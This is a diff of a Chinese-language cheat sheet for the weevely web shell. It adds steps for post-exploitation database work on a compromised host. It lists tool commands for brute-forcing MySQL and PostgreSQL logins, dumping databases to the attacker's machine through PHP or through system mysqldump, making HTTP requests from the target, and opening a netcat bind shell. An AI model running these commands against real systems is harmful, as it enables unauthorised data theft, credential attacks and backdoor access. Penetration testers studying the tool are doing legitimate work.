@@ -34,12 +34,17 @@
     * 工具命令`:net_curl http://ipconfig.io/json`  模拟curl 使用目标主机发起http(s)请求
 * DB数据库操作
   * SQL交互
-    * 工具命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句如`show databases;`
+    * 工具命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句
+      * 对MySQL进行信息搜集 `SELECT version();` `show databases;`
   * 暴力枚举数据库用户名和口令 只支持mysql和pgsql
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users root -pwds db123456 admin123` 简单枚举 成功会出现`root:pass`
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`字典枚举
-  * dump数据库到本地 支持mysql,pgsql,sqlite,dblib
-    * 工具命令`:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306` 把数据库dump 下载保存到本地目录`/var`下. 可指定保存为本地文件`-lpath /Users/xxx/Downloads/db1.sqldump`
+  * dump数据库到本地（前提是MySQL需要权限 可导出文件到某目录）
+    * 查看MySQL权限 `show global variables like '%secure_file_priv%';` 如果结果为NULL则无法导入导出. 可以考虑把select * from tab1的结果保存下来
+    * 实现dump方式1 使用php实现(默认) 支持mysql,pgsql,sqlite,dblib  php代码见[weevely3/mysqldump.tpl](https://github.com/epinna/weevely3/blob/master/modules/sql/_dump/mysqldump.tpl) 原项目为[mysqldump-php](https://github.com/ifsnop/mysqldump-php)
+    * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306` 把数据库dump 下载保存到本地目录`/var`下. 可指定保存为本地文件`-lpath /Users/xxx/Downloads/db1.sqldump`
+    * 实现dump方式2 执行系统命令(只支持MySQL) 使用weevely中定义的php类`ShellCmd`执行系统命令启动`mysqldump`程序实现
+    * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306 -vector mysqldump_sh`
 * 派生shell
   * 正向shell`:backdoor_tcp`
     * 工具命令`:backdoor_tcp 8811 -vector netcat` 在目标主机(被控端)公网IP上开启端口监听 1.1.1.1:8811   主控端执行`nc 1.1.1.1 8811`
